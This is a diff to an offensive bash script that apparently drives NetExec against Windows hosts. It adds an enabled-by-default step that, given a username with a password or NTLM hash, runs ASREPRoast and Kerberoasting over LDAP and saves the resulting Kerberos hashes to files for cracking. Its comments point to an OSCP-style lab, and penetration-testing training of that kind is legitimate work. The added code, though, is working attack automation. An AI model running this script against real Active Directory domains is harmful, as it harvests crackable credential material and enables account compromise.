@@ -16,6 +16,8 @@ usage() {
     echo -e "${GREY}       --no-vulns    : protocol sweep only, skip MS17-010 / Zerologon / etc"
     echo -e "${GREY}       --vulns-only  : skip protocol sweep, run Windows vuln modules only"
     echo -e "${GREY}       --no-guest    : skip the default SMB guest-account fallback"
+    echo -e "${GREY}       --no-roast    : skip post-auth ASREPRoast / Kerberoasting (default: run when creds valid)"
+    echo -e "${GREY}       Hash/domain/KDC pass as global flags: -H <hash>, -d <domain>, --kdcHost <ip>"
     exit 1
 }
 
@@ -35,6 +37,7 @@ PASS=""
 RUN_VULNS=1          # run Windows vuln modules on SMB by default
 VULNS_ONLY=0         # skip the protocol sweep, only run vuln modules
 RUN_GUEST=1          # also try the SMB guest account by default (null-session fallback)
+RUN_ROAST=1          # run ASREPRoast / Kerberoasting when credentials authenticate
 GLOBAL_FLAGS=()
 while [[ "$#" -gt 0 ]]; do
     case $1 in
@@ -43,6 +46,7 @@ while [[ "$#" -gt 0 ]]; do
         --no-vulns) RUN_VULNS=0; shift 1 ;;
         --vulns-only) VULNS_ONLY=1; shift 1 ;;
         --no-guest) RUN_GUEST=0; shift 1 ;;
+        --no-roast) RUN_ROAST=0; shift 1 ;;
         *) GLOBAL_FLAGS+=("$1"); shift 1 ;;
     esac
 done
@@ -136,6 +140,79 @@ run_vulns() {
     done
 }
 
+# --- Kerberos attacks (post-auth only) ---
+# ASREPRoast and Kerberoasting need valid AD credentials. nxc ldap only
+# dispatches --asreproast / --kerberoasting after a successful login, so a
+# plain nxc ldap call gates them for us (no fragile re-check needed).
+# The KDC name from the target's LDAP banner is often not resolvable in lab
+# DNS (e.g. "OSCP.EXAM:88 ... name or service not known"), so default
+# --kdcHost to the target when it speaks Kerberos (port 88) and no override
+# was supplied.
+check_roast() {
+    [[ "$RUN_ROAST" -eq 1 ]] || return
+
+    # no username => nothing to authenticate/roast with
+    [[ -z "$USER" ]] && {
+        echo -e "${GREY}[-] No username (-u). Skipping ASREPRoast/Kerberoasting."
+        return
+    }
+    [[ "${USER,,}" == "guest" ]] && return
+
+    # pull -H / -d / --kdcHost out of the pass-through global flags so we can
+    # rebuild a clean ldap command without duplicating -p/-H.
+    local HASH="" DOMAIN="" KDC_HOST=""
+    local i g
+    for ((i=0; i<${#GLOBAL_FLAGS[@]}; i++)); do
+        g="${GLOBAL_FLAGS[i]}"
+        case "$g" in
+            -H|--hash) HASH="${GLOBAL_FLAGS[i+1]}" ;;
+            -d) DOMAIN="${GLOBAL_FLAGS[i+1]}" ;;
+            --kdcHost|--kdc-host) KDC_HOST="${GLOBAL_FLAGS[i+1]}" ;;
+        esac
+    done
+
+    # need at least a password or an NTLM hash to authenticate
+    if [[ -z "$PASS" && -z "$HASH" ]]; then
+        echo -e "${GREY}[-] No password (-p) or hash (-H). Skipping ASREPRoast/Kerberoasting."
+        return
+    fi
+
+    if ! nc -z -w 1 "$TARGET" 389 2>/dev/null; then
+        echo -e "${GREY}[-] Port 389 closed/filtered. Skipping ASREPRoast/Kerberoasting"
+        return
+    fi
+
+    # target speaks Kerberos => it is the KDC for this box; use it to dodge
+    # unresolvable domain names unless the operator overrode --kdcHost.
+    if [[ -z "$KDC_HOST" ]] && nc -z -w 1 "$TARGET" 88 2>/dev/null; then
+        KDC_HOST="$TARGET"
+    fi
+
+    local SAFE="${TARGET//[^a-zA-Z0-9._-]/_}"
+    local ASREP="asreproast_${SAFE}.txt"
+    local KERB="kerberoasting_${SAFE}.txt"
+
+    local CMD=(nxc ldap "$TARGET" -u "$USER")
+    [[ -n "$HASH" ]] && CMD+=(-H "$HASH") || CMD+=(-p "$PASS")
+    [[ -n "$DOMAIN" ]] && CMD+=(-d "$DOMAIN")
+    [[ -n "$KDC_HOST" ]] && CMD+=(--kdcHost "$KDC_HOST")
+    CMD+=(--asreproast "$ASREP" --kerberoasting "$KERB")
+
+    echo -e "${GREEN}[+] Authenticated as ${USER}. Running ASREPRoast + Kerberoasting ..."
+    "${CMD[@]}"
+
+    if [[ -s "$ASREP" ]]; then
+        echo -e "${BLUE}[*] ASREPRoast hashes -> $ASREP"
+    else
+        echo -e "${GREY}[-] No ASREPRoast-able accounts (no hashes written)."
+    fi
+    if [[ -s "$KERB" ]]; then
+        echo -e "${BLUE}[*] Kerberoasting hashes -> $KERB"
+    else
+        echo -e "${GREY}[-] No kerberoastable accounts / tickets (no hashes written)."
+    fi
+}
+
 # --- Protocols ---
 if [[ "$VULNS_ONLY" -eq 0 ]]; then
     check_and_run 445 "smb" "--shares"
@@ -156,5 +233,9 @@ if [[ "$RUN_VULNS" -eq 1 || "$VULNS_ONLY" -eq 1 ]]; then
     echo -e "${BLUE}[*] --- Windows vulnerability checks ---\n"
     run_vulns
 fi
+
+# --- Kerberos attacks (ASREPRoast / Kerberoasting) ---
+echo -e "${BLUE}[*] --- Kerberos attack checks ---\n"
+check_roast
 
 echo -e "${BLUE}[*] All active services checked."
